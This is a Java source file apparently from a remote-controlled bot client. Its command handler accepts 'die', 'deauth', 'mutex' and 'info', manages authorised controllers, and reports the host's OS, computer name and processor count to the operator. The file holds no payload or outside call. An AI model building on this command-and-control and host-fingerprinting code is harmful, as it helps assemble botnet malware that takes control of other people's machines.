package syn.modules;

import syn.main.Client;
import syn.utils.Utilities;

public class FunctionModule extends Module {

	public FunctionModule() {
		super("die deauth mutex info");
	}
	
	public void process() {
		Utilities uc = Client.getInstance().uc;
		
		if(cmd.equals("die")) {
			uc.getNetworkThread().disconnect();		
		} else if(cmd.equals("deauth")) {
			Client.getInstance().authedUsers.remove(uc.getUser(preCmd));
			uc.write(uc.getUser(preCmd) + " DEAUTHED");
		} else if(cmd.equals("mutex")) {
			uc.write(Client.getInstance().mutexStr);
		} else if(cmd.equals("info")) {
			uc.write("»[OS]: " + uc.procOS(Client.getInstance().os) + " | " + System.getenv("COMPUTERNAME") + "-X" + Runtime.getRuntime().availableProcessors());
		}
	}
}